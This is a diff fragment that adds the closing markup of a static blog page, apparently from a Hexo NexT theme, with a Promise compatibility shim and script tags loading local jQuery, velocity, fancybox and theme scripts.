+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
